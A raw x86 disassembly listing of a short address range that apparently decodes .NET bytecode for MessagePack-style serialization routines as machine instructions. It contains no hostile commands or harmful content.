  4051b8:	06                   	push   %es
  4051b9:	09 17                	or     %edx,(%edi)
  4051bb:	58                   	pop    %eax
  4051bc:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051c1:	2a 06                	sub    (%esi),%al
  4051c3:	20 de                	and    %bl,%dh
  4051c5:	00 00                	add    %al,(%eax)
  4051c7:	00 40 55             	add    %al,0x55(%eax)
  4051ca:	00 00                	add    %al,(%eax)
  4051cc:	00 18                	add    %bl,(%eax)
  4051ce:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4051d2:	01 0b                	add    %ecx,(%ebx)
  4051d4:	03 07                	add    (%edi),%eax
  4051d6:	16                   	push   %ss
  4051d7:	18 6f 45             	sbb    %ch,0x45(%edi)
  4051da:	00 00                	add    %al,(%eax)
  4051dc:	0a 26                	or     (%esi),%ah
  4051de:	07                   	pop    %es
  4051df:	28 58 00             	sub    %bl,0x0(%eax)
  4051e2:	00 06                	add    %al,(%esi)
  4051e4:	0b 07                	or     (%edi),%eax
  4051e6:	16                   	push   %ss
  4051e7:	28 07                	sub    %al,(%edi)
  4051e9:	01 00                	add    %eax,(%eax)
  4051eb:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4051ee:	28 6b 00             	sub    %ch,0x0(%ebx)
  4051f1:	00 06                	add    %al,(%esi)
  4051f3:	02 18                	add    (%eax),%bl
  4051f5:	7d 36                	jge    0x40522d
  4051f7:	00 00                	add    %al,(%eax)
  4051f9:	04 16                	add    $0x16,%al
  4051fb:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405200:	00 02                	add    %al,(%edx)
  405202:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405206:	06                   	push   %es
  405207:	25 03 28 96 00       	and    $0x962803,%eax
  40520c:	00 06                	add    %al,(%esi)
  40520e:	6f                   	outsl  %ds:(%esi),(%dx)
  40520f:	6a 00                	push   $0x0
  405211:	00 06                	add    %al,(%esi)
  405213:	03 6f 88             	add    -0x78(%edi),%ebp
  405216:	00 00                	add    %al,(%eax)
  405218:	06                   	push   %es
  405219:	09 17                	or     %edx,(%edi)
  40521b:	58                   	pop    %eax
  40521c:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405221:	2a 06                	sub    (%esi),%al
  405223:	20 df                	and    %bl,%bh
  405225:	00 00                	add    %al,(%eax)
  405227:	00 40 55             	add    %al,0x55(%eax)
  40522a:	00 00                	add    %al,(%eax)
  40522c:	00 1a                	add    %bl,(%edx)
  40522e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405232:	01 0b                	add    %ecx,(%ebx)
  405234:	03 07                	add    (%edi),%eax
  405236:	16                   	push   %ss
  405237:	1a 6f 45             	sbb    0x45(%edi),%ch
  40523a:	00 00                	add    %al,(%eax)
  40523c:	0a 26                	or     (%esi),%ah
  40523e:	07                   	pop    %es
  40523f:	28 58 00             	sub    %bl,0x0(%eax)
  405242:	00 06                	add    %al,(%esi)
  405244:	0b 07                	or     (%edi),%eax
  405246:	16                   	push   %ss
  405247:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40524b:	0a 0c 02             	or     (%edx,%eax,1),%cl
  40524e:	28 6b 00             	sub    %ch,0x0(%ebx)
  405251:	00 06                	add    %al,(%esi)
  405253:	02 18                	add    (%eax),%bl
  405255:	7d 36                	jge    0x40528d
  405257:	00 00                	add    %al,(%eax)
  405259:	04 16                	add    $0x16,%al
  40525b:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405260:	00 02                	add    %al,(%edx)
  405262:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405266:	06                   	push   %es
  405267:	25 03 28 96 00       	and    $0x962803,%eax
  40526c:	00 06                	add    %al,(%esi)
  40526e:	6f                   	outsl  %ds:(%esi),(%dx)
  40526f:	6a 00                	push   $0x0
  405271:	00 06                	add    %al,(%esi)
  405273:	03 6f 88             	add    -0x78(%edi),%ebp
  405276:	00 00                	add    %al,(%eax)
  405278:	06                   	push   %es
  405279:	09 17                	or     %edx,(%edi)
  40527b:	58                   	pop    %eax
  40527c:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405281:	2a 06                	sub    (%esi),%al
  405283:	20 da                	and    %bl,%dl
  405285:	00 00                	add    %al,(%eax)
  405287:	00 40 0e             	add    %al,0xe(%eax)
  40528a:	00 00                	add    %al,(%eax)
  40528c:	00 02                	add    %al,(%edx)
  40528e:	06                   	push   %es
  40528f:	03 28                	add    (%eax),%ebp
  405291:	97                   	xchg   %eax,%edi
  405292:	00 00                	add    %al,(%eax)
  405294:	06                   	push   %es
  405295:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40529b:	06                   	push   %es
  40529c:	20 db                	and    %bl,%bl
  40529e:	00 00                	add    %al,(%eax)
  4052a0:	00 40 0e             	add    %al,0xe(%eax)
  4052a3:	00 00                	add    %al,(%eax)
  4052a5:	00 02                	add    %al,(%edx)
  4052a7:	06                   	push   %es
  4052a8:	03 28                	add    (%eax),%ebp
  4052aa:	97                   	xchg   %eax,%edi
  4052ab:	00 00                	add    %al,(%eax)
  4052ad:	06                   	push   %es
  4052ae:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  4052b4:	06                   	push   %es
  4052b5:	20 d0                	and    %dl,%al
  4052b7:	00 00                	add    %al,(%eax)
  4052b9:	00 40 0f             	add    %al,0xf(%eax)
  4052bc:	00 00                	add    %al,(%eax)
  4052be:	00 02                	add    %al,(%edx)
  4052c0:	03 6f 00             	add    0x0(%edi),%ebp
  4052c3:	01 00                	add    %eax,(%eax)
  4052c5:	0a 67 6a             	or     0x6a(%edi),%ah
  4052c8:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  4052cc:	06                   	push   %es
  4052cd:	2a 06                	sub    (%esi),%al
  4052cf:	20 d1                	and    %dl,%cl
  4052d1:	00 00                	add    %al,(%eax)
  4052d3:	00 40 27             	add    %al,0x27(%eax)
  4052d6:	00 00                	add    %al,(%eax)
  4052d8:	00 18                	add    %bl,(%eax)
  4052da:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4052de:	01 0b                	add    %ecx,(%ebx)
  4052e0:	03 07                	add    (%edi),%eax
  4052e2:	16                   	push   %ss
  4052e3:	18 6f 45             	sbb    %ch,0x45(%edi)
  4052e6:	00 00                	add    %al,(%eax)
  4052e8:	0a 26                	or     (%esi),%ah
  4052ea:	07                   	pop    %es
  4052eb:	28 58 00             	sub    %bl,0x0(%eax)
  4052ee:	00 06                	add    %al,(%esi)
  4052f0:	0b 02                	or     (%edx),%eax
  4052f2:	07                   	pop    %es
  4052f3:	16                   	push   %ss
  4052f4:	28 07                	sub    %al,(%edi)
  4052f6:	01 00                	add    %eax,(%eax)
  4052f8:	0a 6a 28             	or     0x28(%edx),%ch
  4052fb:	74 00                	je     0x4052fd
  4052fd:	00 06                	add    %al,(%esi)
  4052ff:	2a 06                	sub    (%esi),%al
  405301:	20 d2                	and    %dl,%dl
  405303:	00 00                	add    %al,(%eax)
  405305:	00 40 27             	add    %al,0x27(%eax)
  405308:	00 00                	add    %al,(%eax)
  40530a:	00 1a                	add    %bl,(%edx)
  40530c:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405310:	01 0b                	add    %ecx,(%ebx)
  405312:	03 07                	add    (%edi),%eax
  405314:	16                   	push   %ss
  405315:	1a 6f 45             	sbb    0x45(%edi),%ch
  405318:	00 00                	add    %al,(%eax)
  40531a:	0a 26                	or     (%esi),%ah
  40531c:	07                   	pop    %es
  40531d:	28 58 00             	sub    %bl,0x0(%eax)
  405320:	00 06                	add    %al,(%esi)
  405322:	0b 02                	or     (%edx),%eax
  405324:	07                   	pop    %es
  405325:	16                   	push   %ss
  405326:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40532a:	0a 6a 28             	or     0x28(%edx),%ch
  40532d:	74 00                	je     0x40532f
  40532f:	00 06                	add    %al,(%esi)
  405331:	2a 06                	sub    (%esi),%al
  405333:	20 d3                	and    %dl,%bl
  405335:	00 00                	add    %al,(%eax)
  405337:	00 40 25             	add    %al,0x25(%eax)
  40533a:	00 00                	add    %al,(%eax)
  40533c:	00 1e                	add    %bl,(%esi)
  40533e:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405342:	01 0b                	add    %ecx,(%ebx)
  405344:	03 07                	add    (%edi),%eax
  405346:	16                   	push   %ss
  405347:	1e                   	push   %ds
  405348:	6f                   	outsl  %ds:(%esi),(%dx)
  405349:	45                   	inc    %ebp
  40534a:	00 00                	add    %al,(%eax)
  40534c:	0a 26                	or     (%esi),%ah
  40534e:	07                   	pop    %es
  40534f:	28 58 00             	sub    %bl,0x0(%eax)
  405352:	00 06                	add    %al,(%esi)
  405354:	0b 02                	or     (%edx),%eax
  405356:	07                   	pop    %es
  405357:	16                   	push   %ss
  405358:	28 08                	sub    %cl,(%eax)
  40535a:	01 00                	add    %eax,(%eax)
  40535c:	0a 28                	or     (%eax),%ch
  40535e:	74 00                	je     0x405360
  405360:	00 06                	add    %al,(%esi)
  405362:	2a 00                	sub    (%eax),%al
  405364:	1b 30                	sbb    (%eax),%esi
  405366:	04 00                	add    $0x0,%al
  405368:	4d                   	dec    %ebp
  405369:	00 00                	add    %al,(%eax)
  40536b:	00 27                	add    %ah,(%edi)
  40536d:	00 00                	add    %al,(%eax)
  40536f:	11 73 d0             	adc    %esi,-0x30(%ebx)
  405372:	00 00                	add    %al,(%eax)
  405374:	0a 0a                	or     (%edx),%cl
  405376:	02 06                	add    (%esi),%al
  405378:	28 8a 00 00 06 06    	sub    %cl,0x6060000(%edx)
  40537e:	6f                   	outsl  %ds:(%esi),(%dx)
  40537f:	e2 00                	loop   0x405381
  405381:	00 0a                	add    %cl,(%edx)
  405383:	d4 8d                	aam    $0x8d
  405385:	44                   	inc    %esp
  405386:	00 00                	add    %al,(%eax)
  405388:	01 0b                	add    %ecx,(%ebx)
  40538a:	06                   	push   %es
  40538b:	16                   	push   %ss
  40538c:	6a 6f                	push   $0x6f
  40538e:	4e                   	dec    %esi
  40538f:	00 00                	add    %al,(%eax)
  405391:	0a 06                	or     (%esi),%al
  405393:	07                   	pop    %es
  405394:	16                   	push   %ss
  405395:	06                   	push   %es
  405396:	6f                   	outsl  %ds:(%esi),(%dx)
  405397:	e2 00                	loop   0x405399
  405399:	00 0a                	add    %cl,(%edx)
  40539b:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  4053a2:	07                   	pop    %es
  4053a3:	28 a3 00 00 06 0c    	sub    %ah,0xc060000(%ebx)
  4053a9:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  4053af:	39 06                	cmp    %eax,(%esi)
  4053b1:	00 00                	add    %al,(%eax)
  4053b3:	00 06                	add    %al,(%esi)
  4053b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4053b6:	33 00                	xor    (%eax),%eax
  4053b8:	00 0a                	add    %cl,(%edx)
  4053ba:	dc 08                	fmull  (%eax)
  4053bc:	2a 00                	sub    (%eax),%al
  4053be:	00 00                	add    %al,(%eax)
  4053c0:	01 10                	add    %edx,(%eax)
  4053c2:	00 00                	add    %al,(%eax)
  4053c4:	02 00                	add    (%eax),%al
  4053c6:	06                   	push   %es
  4053c7:	00 38                	add    %bh,(%eax)
  4053c9:	3e 00 0d 00 00 00 00 	add    %cl,%ds:0x0
  4053d0:	13 30                	adc    (%eax),%esi
  4053d2:	02 00                	add    (%eax),%al
  4053d4:	ec                   	in     (%dx),%al
  4053d5:	00 00                	add    %al,(%eax)
  4053d7:	00 20                	add    %ah,(%eax)
  4053d9:	00 00                	add    %al,(%eax)
  4053db:	11 02                	adc    %eax,(%edx)
  4053dd:	7b 36                	jnp    0x405415
  4053df:	00 00                	add    %al,(%eax)
  4053e1:	04 0a                	add    $0xa,%al
  4053e3:	06                   	push   %es
  4053e4:	45                   	inc    %ebp
  4053e5:	0c 00                	or     $0x0,%al
  4053e7:	00 00                	add    %al,(%eax)
  4053e9:	05 00 00 00 05       	add    $0x5000000,%eax
  4053ee:	00 00                	add    %al,(%eax)
  4053f0:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  4053f6:	00 00                	add    %al,(%eax)
  4053f8:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4053fb:	00 00                	add    %al,(%eax)
  4053fd:	1e                   	push   %ds
  4053fe:	00 00                	add    %al,(%eax)
  405400:	00 30                	add    %dh,(%eax)
  405402:	00 00                	add    %al,(%eax)
  405404:	00 42 00             	add    %al,0x0(%edx)
  405407:	00 00                	add    %al,(%eax)
  405409:	54                   	push   %esp
  40540a:	00 00                	add    %al,(%eax)
  40540c:	00 66 00             	add    %ah,0x0(%esi)
  40540f:	00 00                	add    %al,(%eax)
  405411:	79 00                	jns    0x405413
  405413:	00 00                	add    %al,(%eax)
  405415:	86 00                	xchg   %al,(%eax)
  405417:	00 00                	add    %al,(%eax)
  405419:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  40541f:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  405425:	03 02                	add    (%edx),%eax
  405427:	7b 35                	jnp    0x40545e
  405429:	00 00                	add    %al,(%eax)
  40542b:	04 74                	add    $0x74,%al
  40542d:	38 00                	cmp    %al,(%eax)
  40542f:	00 01                	add    %al,(%ecx)
  405431:	28 9a 00 00 06 2a    	sub    %bl,0x2a060000(%edx)
  405437:	03 02                	add    (%edx),%eax
  405439:	7b 35                	jnp    0x405470
  40543b:	00 00                	add    %al,(%eax)
  40543d:	04 a5                	add    $0xa5,%al
  40543f:	68 00 00 01 28       	push   $0x28010000
  405444:	a0 00 00 06 2a       	mov    0x2a060000,%al
  405449:	03 02                	add    (%edx),%eax
  40544b:	7b 35                	jnp    0x405482
  40544d:	00 00                	add    %al,(%eax)
  40544f:	04 a5                	add    $0xa5,%al
  405451:	95                   	xchg   %eax,%ebp
  405452:	00 00                	add    %al,(%eax)
  405454:	01 28                	add    %ebp,(%eax)
  405456:	9f                   	lahf
  405457:	00 00                	add    %al,(%eax)
  405459:	06                   	push   %es
  40545a:	2a 03                	sub    (%ebx),%al
  40545c:	02 7b 35             	add    0x35(%ebx),%bh
  40545f:	00 00                	add    %al,(%eax)
  405461:	04 a5                	add    $0xa5,%al
  405463:	6c                   	insb   (%dx),%es:(%edi)
  405464:	00 00                	add    %al,(%eax)
  405466:	01 28                	add    %ebp,(%eax)
  405468:	9e                   	sahf
  405469:	00 00                	add    %al,(%eax)
  40546b:	06                   	push   %es
  40546c:	2a 03                	sub    (%ebx),%al
  40546e:	02 7b 35             	add    0x35(%ebx),%bh
  405471:	00 00                	add    %al,(%eax)
  405473:	04 a5                	add    $0xa5,%al
  405475:	96                   	xchg   %eax,%esi
  405476:	00 00                	add    %al,(%eax)
  405478:	01 28                	add    %ebp,(%eax)
  40547a:	9c                   	pushf
  40547b:	00 00                	add    %al,(%eax)
  40547d:	06                   	push   %es
  40547e:	2a 03                	sub    (%ebx),%al
  405480:	02 7b 35             	add    0x35(%ebx),%bh
  405483:	00 00                	add    %al,(%eax)
  405485:	04 a5                	add    $0xa5,%al
  405487:	97                   	xchg   %eax,%edi
  405488:	00 00                	add    %al,(%eax)
  40548a:	01 6c 28 9c          	add    %ebp,-0x64(%eax,%ebp,1)
  40548e:	00 00                	add    %al,(%eax)
  405490:	06                   	push   %es
  405491:	2a 03                	sub    (%ebx),%al
  405493:	02 28                	add    (%eax),%ch
  405495:	77 00                	ja     0x405497
  405497:	00 06                	add    %al,(%esi)
  405499:	28 a0 00 00 06 2a    	sub    %ah,0x2a060000(%eax)
  40549f:	03 02                	add    (%edx),%eax
  4054a1:	7b 35                	jnp    0x4054d8
  4054a3:	00 00                	add    %al,(%eax)
  4054a5:	04 74                	add    $0x74,%al
  4054a7:	02 00                	add    (%eax),%al
  4054a9:	00 1b                	add    %bl,(%ebx)
  4054ab:	28 9b 00 00 06 2a    	sub    %bl,0x2a060000(%ebx)
  4054b1:	02 03                	add    (%ebx),%al
  4054b3:	28 72 00             	sub    %dh,0x0(%edx)
  4054b6:	00 06                	add    %al,(%esi)
  4054b8:	2a 02                	sub    (%edx),%al
  4054ba:	03 28                	add    (%eax),%ebp
  4054bc:	73 00                	jae    0x4054be
  4054be:	00 06                	add    %al,(%esi)
  4054c0:	2a 03                	sub    (%ebx),%al
  4054c2:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  4054c8:	1b 30                	sbb    (%eax),%esi
  4054ca:	03 00                	add    (%eax),%eax
  4054cc:	42                   	inc    %edx
  4054cd:	00 00                	add    %al,(%eax)
  4054cf:	00 28                	add    %ch,(%eax)
  4054d1:	00 00                	add    %al,(%eax)
  4054d3:	11 02                	adc    %eax,(%edx)
  4054d5:	0a 16                	or     (%esi),%dl
  4054d7:	0b 06                	or     (%esi),%eax
  4054d9:	12 01                	adc    (%ecx),%al
  4054db:	28 49 00             	sub    %cl,0x0(%ecx)
  4054de:	00 0a                	add    %cl,(%edx)
  4054e0:	02 7b 39             	add    0x39(%ebx),%bh
  4054e3:	00 00                	add    %al,(%eax)
  4054e5:	04 3a                	add    $0x3a,%al
  4054e7:	12 00                	adc    (%eax),%al
  4054e9:	00 00                	add    %al,(%eax)
  4054eb:	02 02                	add    (%edx),%al
  4054ed:	02 7b 38             	add    0x38(%ebx),%bh
  4054f0:	00 00                	add    %al,(%eax)
  4054f2:	04 73                	add    $0x73,%al
  4054f4:	63 00                	arpl   %eax,(%eax)
  4054f6:	00 06                	add    %al,(%esi)
  4054f8:	7d 39                	jge    0x405533
  4054fa:	00 00                	add    %al,(%eax)
  4054fc:	04 dd                	add    $0xdd,%al
  4054fe:	0d 00 00 00 07       	or     $0x7000000,%eax
  405503:	39 06                	cmp    %eax,(%esi)
  405505:	00 00                	add    %al,(%eax)
  405507:	00 06                	add    %al,(%esi)
  405509:	28 50 00             	sub    %dl,0x0(%eax)
  40550c:	00 0a                	add    %cl,(%edx)
  40550e:	dc 02                	faddl  (%edx)
  405510:	7b 39                	jnp    0x40554b
  405512:	00 00                	add    %al,(%eax)
  405514:	04 2a                	add    $0x2a,%al
  405516:	00 00                	add    %al,(%eax)
  405518:	01 10                	add    %edx,(%eax)
  40551a:	00 00                	add    %al,(%eax)
  40551c:	02 00                	add    (%eax),%al
  40551e:	04 00                	add    $0x0,%al
  405520:	2a 2e                	sub    (%esi),%ch
  405522:	00 0d 00 00 00 00    	add    %cl,0x0
  405528:	13 30                	adc    (%eax),%esi
  40552a:	04 00                	add    $0x0,%al
  40552c:	18 00                	sbb    %al,(%eax)
  40552e:	00 00                	add    %al,(%eax)
  405530:	29 00                	sub    %eax,(%eax)
  405532:	00 11                	add    %dl,(%ecx)
  405534:	03 8d 44 00 00 01    	add    0x1000044(%ebp),%ecx
  40553a:	0a 02                	or     (%edx),%al
  40553c:	06                   	push   %es
  40553d:	16                   	push   %ss
  40553e:	03 6f 45             	add    0x45(%edi),%ebp
  405541:	00 00                	add    %al,(%eax)
  405543:	0a 26                	or     (%esi),%ah
  405545:	06                   	push   %es
  405546:	28 55 00             	sub    %dl,0x0(%ebp)
  405549:	00 06                	add    %al,(%esi)
  40554b:	2a 13                	sub    (%ebx),%dl
  40554d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405550:	b1 00                	mov    $0x0,%cl
  405552:	00 00                	add    %al,(%eax)
  405554:	2a 00                	sub    (%eax),%al
  405556:	00 11                	add    %dl,(%ecx)
  405558:	14 0a                	adc    $0xa,%al
  40555a:	16                   	push   %ss
  40555b:	0b 02                	or     (%edx),%eax
  40555d:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  405563:	18 00                	sbb    %al,(%eax)
  405565:	00 00                	add    %al,(%eax)
  405567:	02 20                	add    (%eax),%ah
  405569:	bf 00 00 00 3d       	mov    $0x3d000000,%edi
  40556e:	0d 00 00 00 02       	or     $0x2000000,%eax
  405573:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  405579:	0b 38                	or     (%eax),%edi
  40557b:	72 00                	jb     0x40557d
  40557d:	00 00                	add    %al,(%eax)
  40557f:	02 20                	add    (%eax),%ah
  405581:	d9 00                	flds   (%eax)
  405583:	00 00                	add    %al,(%eax)
  405585:	40                   	inc    %eax
  405586:	0c 00                	or     $0x0,%al
  405588:	00 00                	add    %al,(%eax)
  40558a:	03 6f 00             	add    0x0(%edi),%ebp
  40558d:	01 00                	add    %eax,(%eax)
  40558f:	0a 0b                	or     (%ebx),%cl
  405591:	38 5b 00             	cmp    %bl,0x0(%ebx)
  405594:	00 00                	add    %al,(%eax)
  405596:	02 20                	add    (%eax),%ah
  405598:	da 00                	fiaddl (%eax)
  40559a:	00 00                	add    %al,(%eax)
  40559c:	40                   	inc    %eax
  40559d:	25 00 00 00 18       	and    $0x18000000,%eax
  4055a2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055a6:	01 0a                	add    %ecx,(%edx)
  4055a8:	03 06                	add    (%esi),%eax
  4055aa:	16                   	push   %ss
  4055ab:	18 6f 45             	sbb    %ch,0x45(%edi)
  4055ae:	00 00                	add    %al,(%eax)
  4055b0:	0a 26                	or     (%esi),%ah
  4055b2:	06                   	push   %es
  4055b3:	28 58 00             	sub    %bl,0x0(%eax)
  4055b6:	00 06                	add    %al,(%esi)
  4055b8:	0a 06                	or     (%esi),%al
  4055ba:	16                   	push   %ss
  4055bb:	28 02                	sub    %al,(%edx)
  4055bd:	01 00                	add    %eax,(%eax)
  4055bf:	0a 0b                	or     (%ebx),%cl
  4055c1:	38 2b                	cmp    %ch,(%ebx)
  4055c3:	00 00                	add    %al,(%eax)
  4055c5:	00 02                	add    %al,(%edx)
  4055c7:	20 db                	and    %bl,%bl
  4055c9:	00 00                	add    %al,(%eax)
  4055cb:	00 40 20             	add    %al,0x20(%eax)
  4055ce:	00 00                	add    %al,(%eax)
  4055d0:	00 1a                	add    %bl,(%edx)
  4055d2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055d6:	01 0a                	add    %ecx,(%edx)
  4055d8:	03 06                	add    (%esi),%eax
  4055da:	16                   	push   %ss
  4055db:	1a 6f 45             	sbb    0x45(%edi),%ch
  4055de:	00 00                	add    %al,(%eax)
  4055e0:	0a 26                	or     (%esi),%ah
  4055e2:	06                   	push   %es
  4055e3:	28 58 00             	sub    %bl,0x0(%eax)
  4055e6:	00 06                	add    %al,(%esi)
  4055e8:	0a 06                	or     (%esi),%al
  4055ea:	16                   	push   %ss
  4055eb:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4055ef:	0a 0b                	or     (%ebx),%cl
  4055f1:	07                   	pop    %es
  4055f2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055f6:	01 0a                	add    %ecx,(%edx)
  4055f8:	03 06                	add    (%esi),%eax
  4055fa:	16                   	push   %ss
  4055fb:	07                   	pop    %es
  4055fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4055fd:	45                   	inc    %ebp
  4055fe:	00 00                	add    %al,(%eax)
  405600:	0a 26                	or     (%esi),%ah
  405602:	06                   	push   %es
  405603:	28 55 00             	sub    %dl,0x0(%ebp)
  405606:	00 06                	add    %al,(%esi)
  405608:	2a 00                	sub    (%eax),%al
  40560a:	00 00                	add    %al,(%eax)
  40560c:	13 30                	adc    (%eax),%esi
  40560e:	04 00                	add    $0x0,%al
  405610:	b9 00 00 00 2b       	mov    $0x2b000000,%ecx
  405615:	00 00                	add    %al,(%eax)
  405617:	11 03                	adc    %eax,(%ebx)
  405619:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  40561d:	06                   	push   %es
  40561e:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  405621:	06                   	push   %es
  405622:	8e 69 0c             	mov    0xc(%ecx),%gs
  405625:	16                   	push   %ss
  405626:	0d 08 1f 1f 3d       	or     $0x3d1f1f08,%eax
  40562b:	16                   	push   %ss
  40562c:	00 00                	add    %al,(%eax)
  40562e:	00 20                	add    %ah,(%eax)
  405630:	a0 00 00 00 08       	mov    0x8000000,%al
  405635:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  405638:	0d 02 09 6f ee       	or     $0xee6f0902,%eax
  40563d:	00 00                	add    %al,(%eax)
  40563f:	0a 38                	or     (%eax),%bh
  405641:	80 00 00             	addb   $0x0,(%eax)
  405644:	00 08                	add    %cl,(%eax)
  405646:	20 ff                	and    %bh,%bh
  405648:	00 00                	add    %al,(%eax)
  40564a:	00 3d 1c 00 00 00    	add    %bh,0x1c
  405650:	20 d9                	and    %bl,%cl
  405652:	00 00                	add    %al,(%eax)
  405654:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  40565a:	00 00                	add    %al,(%eax)
  40565c:	0a 08                	or     (%eax),%cl
  40565e:	d2 0d 02 09 6f ee    	rorb   %cl,0xee6f0902
  405664:	00 00                	add    %al,(%eax)
  405666:	0a 38                	or     (%eax),%bh
  405668:	59                   	pop    %ecx
  405669:	00 00                	add    %al,(%eax)
  40566b:	00 08                	add    %cl,(%eax)
  40566d:	20 ff                	and    %bh,%bh
  40566f:	ff 00                	incl   (%eax)
  405671:	00 3d 2a 00 00 00    	add    %bh,0x2a
  405677:	20 da                	and    %bl,%dl
  405679:	00 00                	add    %al,(%eax)
  40567b:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405681:	00 00                	add    %al,(%eax)
  405683:	0a 08                	or     (%eax),%cl
  405685:	68 28 ef 00 00       	push   $0xef28
  40568a:	0a 28                	or     (%eax),%ch
  40568c:	58                   	pop    %eax
  40568d:	00 00                	add    %al,(%eax)
  40568f:	06                   	push   %es
  405690:	0b 02                	or     (%edx),%eax
  405692:	07                   	pop    %es
  405693:	16                   	push   %ss
  405694:	07                   	pop    %es
  405695:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405698:	4c                   	dec    %esp
  405699:	00 00                	add    %al,(%eax)
  40569b:	0a 38                	or     (%eax),%bh
  40569d:	24 00                	and    $0x0,%al
  40569f:	00 00                	add    %al,(%eax)
  4056a1:	20 db                	and    %bl,%bl
  4056a3:	00 00                	add    %al,(%eax)
  4056a5:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  4056ab:	00 00                	add    %al,(%eax)
  4056ad:	0a 08                	or     (%eax),%cl
  4056af:	28 4a 00             	sub    %cl,0x0(%edx)
  4056b2:	00 0a                	add    %cl,(%edx)
  4056b4:	28 58 00             	sub    %bl,0x0(%eax)
  4056b7:	00 06                	add    %al,(%esi)
  4056b9:	0b 02                	or     (%edx),%eax
  4056bb:	07                   	pop    %es
  4056bc:	16                   	push   %ss
  4056bd:	07                   	pop    %es
  4056be:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056c1:	4c                   	dec    %esp
  4056c2:	00 00                	add    %al,(%eax)
  4056c4:	0a 02                	or     (%edx),%al
  4056c6:	06                   	push   %es
  4056c7:	16                   	push   %ss
  4056c8:	06                   	push   %es
  4056c9:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056cc:	4c                   	dec    %esp
  4056cd:	00 00                	add    %al,(%eax)
  4056cf:	0a 2a                	or     (%edx),%ch
  4056d1:	00 00                	add    %al,(%eax)
  4056d3:	00 13                	add    %dl,(%ebx)
  4056d5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056d8:	94                   	xchg   %eax,%esp
  4056d9:	00 00                	add    %al,(%eax)
  4056db:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4056de:	00 11                	add    %dl,(%ecx)
  4056e0:	14 0a                	adc    $0xa,%al
  4056e2:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  4056e8:	07                   	pop    %es
  4056e9:	20 ff                	and    %bh,%bh
  4056eb:	00 00                	add    %al,(%eax)
  4056ed:	00 3d 1c 00 00 00    	add    %bh,0x1c
  4056f3:	20 c4                	and    %al,%ah
  4056f5:	00 00                	add    %al,(%eax)
  4056f7:	00 0c 02             	add    %cl,(%edx,%eax,1)
  4056fa:	08 6f ee             	or     %ch,-0x12(%edi)
  4056fd:	00 00                	add    %al,(%eax)
  4056ff:	0a 07                	or     (%edi),%al
  405701:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  405704:	08 6f ee             	or     %ch,-0x12(%edi)
  405707:	00 00                	add    %al,(%eax)
  405709:	0a 38                	or     (%eax),%bh
  40570b:	59                   	pop    %ecx
  40570c:	00 00                	add    %al,(%eax)
  40570e:	00 07                	add    %al,(%edi)
  405710:	20 ff                	and    %bh,%bh
  405712:	ff 00                	incl   (%eax)
  405714:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40571a:	20 c5                	and    %al,%ch
  40571c:	00 00                	add    %al,(%eax)
  40571e:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405721:	08 6f ee             	or     %ch,-0x12(%edi)
  405724:	00 00                	add    %al,(%eax)
  405726:	0a 07                	or     (%edi),%al
  405728:	68 28 ef 00 00       	push   $0xef28
  40572d:	0a 28                	or     (%eax),%ch
  40572f:	58                   	pop    %eax
  405730:	00 00                	add    %al,(%eax)
  405732:	06                   	push   %es
  405733:	0a 02                	or     (%edx),%al
  405735:	06                   	push   %es
  405736:	16                   	push   %ss
  405737:	06                   	push   %es
  405738:	8e 69 6f             	mov    0x6f(%ecx),%gs
  40573b:	4c                   	dec    %esp
  40573c:	00 00                	add    %al,(%eax)
  40573e:	0a 38                	or     (%eax),%bh
  405740:	24 00                	and    $0x0,%al
  405742:	00 00                	add    %al,(%eax)
  405744:	20 c6                	and    %al,%dh
  405746:	00 00                	add    %al,(%eax)
  405748:	00 0c 02             	add    %cl,(%edx,%eax,1)
